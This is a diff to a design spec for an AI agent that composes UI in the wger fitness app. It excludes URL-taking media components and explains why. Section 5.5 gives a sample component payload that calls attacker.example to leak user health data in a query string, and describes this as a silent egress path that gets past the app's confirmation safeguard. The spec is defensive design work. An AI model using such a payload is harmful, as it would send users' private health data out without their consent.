@@ -268,7 +268,9 @@ pointing at any specific vendor's agent (see §6.4).
 
 A2UI ships a Basic Catalog — `Column`, `Row`, `List`, `Card`, `Tabs`, `Divider`, `Modal`, `Text`,
 `Image`, `Icon`, `Video`, `AudioPlayer`, `Button`, `CheckBox`, `TextField`, `DateTimeInput`,
-`ChoicePicker`, `Slider`. **OmniHealth adopts all of it.** The agent composes freely from these.
+`ChoicePicker`, `Slider`. **OmniHealth adopts all of it except the three URL-taking media
+components** — `Image`, `Video`, and `AudioPlayer` are excluded for the reason in §5.5, and replaced
+by id-keyed equivalents. The agent composes freely from everything else.
 
 An earlier draft of this spec defined five custom components. Four of them turned out to be
 compositions the Basic Catalog already expresses (a confirmation is a `Card` with `Text` and two
@@ -278,6 +280,7 @@ genuinely ours:
 | Component | Direction | Why it exists |
 |---|---|---|
 | `MetricChart` | read | The Basic Catalog has no chart primitive, and trend lines are the single most valuable read in a health app. Backed by `fl_chart`, already a wger dependency. |
+| `ExerciseVideo` | read | Replaces the excluded `Video` (§5.5). Takes an **exercise video id**, never a URL. Wraps wger's existing `ExerciseVideoWidget`, which already provides scrubbing and 0.25x/0.5x playback — the latter being the whole point for studying lifting form. Renders CC attribution (§5.6). |
 | `MetricEntryCard` | write | Gathers and commits one scalar metric — value, unit, date — in a single tap. The most common interaction in the app deserves a one-shot path. |
 | `ConfirmationCard` | write | Commits whatever the primitives gathered. "Log 2 eggs, 140 kcal?" with accept and reject. |
 
@@ -336,6 +339,46 @@ in the data model and updates through `updateDataModel`.
 This is what makes live-computed forms possible — a macro total that updates as portions change —
 and it is why the agent does not need to re-render a surface to reflect user input.
 
+### 5.5 No agent-supplied URLs — the silent egress rule
+
+The Basic Catalog's `Image`, `Video`, and `AudioPlayer` take a URL. Rendering one issues a GET to
+that URL. An agent that can choose the URL therefore has a data channel out of the device:
+
+```json
+{"component": "Image", "url": "https://attacker.example/p.png?w=82.4&dx=..."}
+```
+
+The user's data leaves in the query string, and **no tap is required** — merely rendering does it.
+This bypasses the confirmation-token model entirely, because that model guards *writes into wger*
+and says nothing about *reads leaving the device*. It is a strictly worse hole than the write
+problem: silent, unattended, and invisible in the transcript.
+
+The rule, therefore:
+
+> **No component may take a URL, host, or path from the agent.**
+
+Media components take an **id** into data the app already holds. Resolution to an absolute URL
+happens client-side through wger's `mediaUrlBuilderProvider`, which always produces
+`<the user's own server>/media/<path>` and is structurally incapable of addressing another host.
+An agent can ask to show exercise video 412; it cannot ask to show `https://anywhere.else`.
+
+`Icon` stays in the catalog — it selects from a fixed local icon set, not a URL.
+
+This rule generalises beyond media. Any future component that would accept an agent-chosen
+destination — a link, a webview, an embed, an outbound action — is subject to it. When one is
+genuinely needed, the destination must come from an allowlist the app controls, not from the model.
+
+### 5.6 Attribution is a licence obligation, not a nicety
+
+wger's exercise images and videos are Creative Commons licensed, and the `Video` model carries
+`licenseTitle`, `licenseAuthor`, `licenseObjectUrl`, and `licenseAuthorUrl` precisely because CC
+BY-SA requires attribution on display.
+
+`ExerciseVideo` therefore renders attribution as part of the component, not as something the agent
+is trusted to remember to include. An agent that omits it from its prose does not put us out of
+compliance, because the component supplies it unconditionally. The same applies to any future
+image component.
+
 ---
 
 ## 6. Data flow and safety
@@ -376,6 +419,10 @@ boundary; the token check is.
 The user's health data is sent to whichever provider they configured — that is the point of the
 feature, and it must be stated plainly in the UI at key-entry time, naming the provider. Slice 1
 sends only what a turn requires: the conversation and tool results, never a bulk export.
+
+That configured provider must be the **only** destination. §5.5 closes the other one: a rendered
+component that fetches an agent-chosen URL would be a second, silent egress path that the user never
+consented to and never sees. Every future component is measured against that rule.
 
 ### 6.4 ACP and Anthropic's terms
 
